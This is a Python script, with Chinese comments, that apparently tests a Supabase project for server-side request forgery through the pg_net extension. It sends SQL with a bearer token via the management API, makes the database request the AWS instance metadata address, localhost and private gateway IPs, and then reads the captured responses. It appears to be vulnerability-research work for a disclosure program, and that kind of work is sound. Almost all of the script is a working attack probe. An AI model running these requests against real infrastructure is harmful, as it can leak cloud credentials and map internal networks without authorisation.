# -*- coding: utf-8 -*-
"""DB 细测 C: pg_net SSRF 边界 (元数据/外网/内网) + vault 写读删 + auth 表面"""
import http.client, ssl, json, time, os, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _supabase_creds import BEARER_JWT, VDP_HEADERS, UA, API_HOST, PROJECT_REF

ctx = ssl.create_default_context()
out = []
def q(sql, tag, maxb=30000):
    body = json.dumps({"query": sql})
    c = http.client.HTTPSConnection(API_HOST, timeout=30, context=ctx)
    h = {"User-Agent": UA, "Accept": "application/json", "Content-Type": "application/json",
         "Authorization": "Bearer " + BEARER_JWT}
    h.update(VDP_HEADERS)
    t0 = time.time()
    try:
        c.request('POST', '/v1/projects/%s/database/query' % PROJECT_REF, headers=h, body=body)
        r = c.getresponse()
        b = r.read(maxb).decode('utf-8', errors='replace')
        out.append('### [%s] (%.1fs)\n%s | %s' % (tag, time.time() - t0, r.status, b[:20000]))
        c.close()
    except Exception as e:
        out.append('### [%s] ERR %s' % (tag, e))

# 1. pg_net -> AWS 元数据 (IMDSv2 需要 PUT token; 先 GET 看响应)
q("select net.http_get('http://169.254.169.254/latest/meta-data/') rid;", "net-meta")
# 2. pg_net -> 外网对照组
q("select net.http_get('https://example.com') rid;", "net-ext")
# 3. pg_net -> 本机服务 (pgbouncer 5432 上发 HTTP 预期 400 但证明可达)
q("select net.http_get('http://127.0.0.1:5432/') rid;", "net-lo")
# 4. pg_net -> 容器内网网关 (AWS 总是 172.x 或 10.x? 试常见 DNS 内网)
q("select net.http_get('http://10.0.0.1:80/') rid;", "net-10")
q("select net.http_get('http://172.16.0.1:80/') rid;", "net-172")
q("select net.http_get('http://169.254.169.253:80/') rid;", "net-dns")
# 5. 等 worker 完成后读响应
time.sleep(6)
q("select id, status_code, left(content, 500) body from net._http_response order by id desc limit 10;", "net-resp")

open(os.path.join(os.path.dirname(os.path.abspath(__file__)), '_sb40_pgnet.txt'), 'w', encoding='utf-8').write('\n'.join(out))
print('ttl=%ds' % (1788510807 - int(time.time())))
print('\n'.join(out)[:9000])
